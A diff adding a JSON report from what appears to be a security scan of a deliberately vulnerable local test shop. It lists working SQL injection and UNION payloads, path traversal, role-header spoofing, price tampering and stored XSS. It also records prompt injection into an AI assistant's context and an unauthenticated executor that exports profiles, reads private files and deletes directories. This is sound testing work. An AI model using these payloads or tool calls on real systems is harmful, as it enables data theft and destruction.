@@ -1,0 +1,232 @@
+{
+  "target": "http://127.0.0.1:8067",
+  "total": 25,
+  "vulnerable": 25,
+  "checks": [
+    {
+      "id": "SQLI-PROFILE",
+      "title": "SQL injection in /profile id",
+      "severity": "critical",
+      "request": "GET /profile?id=1%20OR%201%3D1",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": ""
+    },
+    {
+      "id": "SQLI-PROFILE-UNION",
+      "title": "UNION injection dumps all profiles",
+      "severity": "critical",
+      "request": "GET /profile?id=-1%20UNION%20SELECT%201%2Cname%2Cemail%2Caddress%20FROM%20profiles",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 1, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": ""
+    },
+    {
+      "id": "SQLI-SEARCH",
+      "title": "SQL injection in /search q",
+      "severity": "critical",
+      "request": "GET /search?q=%27%20OR%201%3D1%20--",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": ""
+    },
+    {
+      "id": "SQLI-CONTEXT",
+      "title": "SQL injection in /assistant/context order_id",
+      "severity": "critical",
+      "request": "GET /assistant/context?order_id=-1%20UNION%20SELECT%201%2Cname%2Cemail%2Caddress%20FROM%20profiles",
+      "vulnerable": true,
+      "evidence": "200 {\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать за",
+      "note": ""
+    },
+    {
+      "id": "ROLE-SPOOF",
+      "title": "X-Role header grants staff export",
+      "severity": "critical",
+      "request": "GET /admin/export with X-Role: staff, no token",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": ""
+    },
+    {
+      "id": "IDOR-PROFILE",
+      "title": "alice reads bob profile",
+      "severity": "high",
+      "request": "GET /profile?id=2 as alice",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": ""
+    },
+    {
+      "id": "IDOR-ORDERS",
+      "title": "unauthenticated listing of all orders",
+      "severity": "high",
+      "request": "GET /orders without token",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]",
+      "note": ""
+    },
+    {
+      "id": "IDOR-SEARCH",
+      "title": "alice enumerates all profiles via /search",
+      "severity": "critical",
+      "request": "GET /search?q=TEST as alice",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": ""
+    },
+    {
+      "id": "IDOR-CONTEXT",
+      "title": "alice reads bob order through assistant context",
+      "severity": "high",
+      "request": "GET /assistant/context?order_id=2 as alice",
+      "vulnerable": true,
+      "evidence": "200 {\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать за",
+      "note": ""
+    },
+    {
+      "id": "FILES-CROSS-USER",
+      "title": "alice reads bob receipt",
+      "severity": "high",
+      "request": "GET /files?user=bob&path=receipt.txt as alice",
+      "vulnerable": true,
+      "evidence": "200 {\"content\": \"TEST_BOB receipt: lamp, 1500 RUB\"}",
+      "note": ""
+    },
+    {
+      "id": "FILES-PRIVATE",
+      "title": "read of private/operator-note.txt",
+      "severity": "critical",
+      "request": "GET /files?user=../private&path=operator-note.txt",
+      "vulnerable": true,
+      "evidence": "200 {\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}",
+      "note": ""
+    },
+    {
+      "id": "PRICE-TAMPER",
+      "title": "client controls order price",
+      "severity": "high",
+      "request": "POST /orders {\"product\":\"chair\",\"price\":1}",
+      "vulnerable": true,
+      "evidence": "201 {\"id\": 3, \"owner\": 1, \"product\": \"chair\", \"price\": 1}",
+      "note": ""
+    },
+    {
+      "id": "PRICE-NEGATIVE",
+      "title": "negative order price accepted",
+      "severity": "medium",
+      "request": "POST /orders {\"product\":\"chair\",\"price\":-5000}",
+      "vulnerable": true,
+      "evidence": "201 {\"id\": 4, \"owner\": 1, \"product\": \"chair\", \"price\": -5000}",
+      "note": ""
+    },
+    {
+      "id": "LOGS-UNAUTH",
+      "title": "unauthenticated debug log dump",
+      "severity": "high",
+      "request": "GET /debug/logs without token",
+      "vulnerable": true,
+      "evidence": "200 [{\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Host\": \"127.0.0.1:8067\", \"User-Age",
+      "note": ""
+    },
+    {
+      "id": "LOGS-TOKEN-LEAK",
+      "title": "session tokens exposed in logs",
+      "severity": "critical",
+      "request": "GET /debug/logs after a login",
+      "vulnerable": true,
+      "evidence": "200 token_present=True",
+      "note": ""
+    },
+    {
+      "id": "LOGS-PASSWORD-LEAK",
+      "title": "plaintext passwords exposed in logs",
+      "severity": "critical",
+      "request": "GET /debug/logs after a login",
+      "vulnerable": true,
+      "evidence": "200 password_present=True",
+      "note": ""
+    },
+    {
+      "id": "REVIEW-UNAUTH",
+      "title": "anonymous review submission",
+      "severity": "medium",
+      "request": "POST /reviews without token",
+      "vulnerable": true,
+      "evidence": "201 {\"saved\": true}",
+      "note": ""
+    },
+    {
+      "id": "PROMPT-INJECTION",
+      "title": "injected review reaches assistant context",
+      "severity": "critical",
+      "request": "GET /assistant/context after malicious review",
+      "vulnerable": true,
+      "evidence": "200 injection_present=True",
+      "note": ""
+    },
+    {
+      "id": "STORED-XSS",
+      "title": "review text rendered as raw HTML",
+      "severity": "high",
+      "request": "POST /reviews then GET /reviews/view",
+      "vulnerable": true,
+      "evidence": "201/200 raw_script_present=True",
+      "note": ""
+    },
+    {
+      "id": "ASSISTANT-EXPORT",
+      "title": "unauthenticated export_profiles via executor",
+      "severity": "critical",
+      "request": "POST /assistant/execute export_profiles without token",
+      "vulnerable": true,
+      "evidence": "200 [{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+      "note": ""
+    },
+    {
+      "id": "ASSISTANT-PRIVATE-FILE",
+      "title": "executor reads private note",
+      "severity": "critical",
+      "request": "POST /assistant/execute read_file private/operator-note.txt",
+      "vulnerable": true,
+      "evidence": "200 {\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}",
+      "note": ""
+    },
+    {
+      "id": "ASSISTANT-CROSS-USER",
+      "title": "executor reads another user's receipt",
+      "severity": "high",
+      "request": "POST /assistant/execute read_file files/bob/receipt.txt",
+      "vulnerable": true,
+      "evidence": "200 {\"content\": \"TEST_BOB receipt: lamp, 1500 RUB\"}",
+      "note": ""
+    },
+    {
+      "id": "VERBOSE-ERROR",
+      "title": "internal exception details leaked",
+      "severity": "medium",
+      "request": "GET /profile?id='",
+      "vulnerable": true,
+      "evidence": "500 {\"error\": \"unrecognized token: \\\"'\\\"\", \"type\": \"OperationalError\"}",
+      "note": ""
+    },
+    {
+      "id": "NO-RATE-LIMIT",
+      "title": "login brute force is not throttled",
+      "severity": "medium",
+      "request": "8 failed logins for unknown user",
+      "vulnerable": true,
+      "evidence": "statuses=[401, 401, 401, 401, 401, 401, 401, 401]",
+      "note": ""
+    },
+    {
+      "id": "ASSISTANT-DELETE",
+      "title": "unauthenticated delete_tree destroys files",
+      "severity": "critical",
+      "request": "POST /assistant/execute delete_tree files/bob",
+      "vulnerable": true,
+      "evidence": "200 {\"deleted\": \"files/bob\"}",
+      "note": ""
+    }
+  ]
+}
